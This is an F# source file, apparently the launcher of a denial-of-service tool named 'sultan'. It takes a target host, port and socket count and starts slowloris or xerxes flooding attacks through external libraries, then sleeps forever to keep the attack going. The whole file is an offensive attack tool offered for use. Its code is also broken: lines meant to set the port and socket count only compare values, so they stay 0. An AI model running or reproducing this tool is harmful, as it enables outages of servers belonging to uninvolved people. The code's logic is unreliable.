#nowarn "20"

open sultan
open sultan.printxlib
open sultan.xerxeslib

open System
open System.Threading

module sultan =

    let E : string = string (char 0x1B)
    let invoke_slowloris (args : string[]) =
        let sockets = 0
        let port = 0
        if args.Length < 2 then
            error "100 Target host not provided. Aborting."
            exit 1
            else verbose "starting...\n"

        if args.Length < 3 then
            printfn "[sultan] No port provided, defaulting to port 80"
            port = 80
            ""
            else
                port = Int32.Parse(args.[2])
                ""

        if args.Length < 4 then
            printfn "[sultan] No socket number provided, defaulting to 100 sockets"
            sockets = 100
            ""
            else
                sockets =  Int32.Parse(args.[3])
                ""

        let weapon = new sllib()
        weapon.attack(args.[1], port, false, sockets);
        Thread.Sleep(Timeout.Infinite);
        0

    let invoke_xerxes (args : string[]) =
            let connections = 0
            let port = 0
            if args.Length < 2 then
                error "200 Target host not provided. Aborting."
                exit 1
                else verbose "starting...\n"

            xerxeslib.attack args.[1] port 0 connections
            Thread.Sleep(Timeout.Infinite);
            0

    let help =
        printfn "sultan v0.2.3"
        printfn "MIT (c) Kied Llaentenn\n"
        printfn "Usage: .\sultan slowloris [host] [port (default: 80)] [socket_count (default: 100)]"
        printfn "Usage: .\sultan xerxes [host] [port (default: 80)]"

    [<EntryPoint>]
    let main argv =
        consoletool.enableVTMode() |> ignore
        // go nuts if there aren't enough args
        if argv.Length < 1 then
            help
            error "001 Not enough arguments. Aborting."
            exit 1
        else

        if (argv.[0]).Equals("slowloris") then invoke_slowloris argv
        elif (argv.[0]).Equals("xerxes") then invoke_xerxes argv else 0
        0

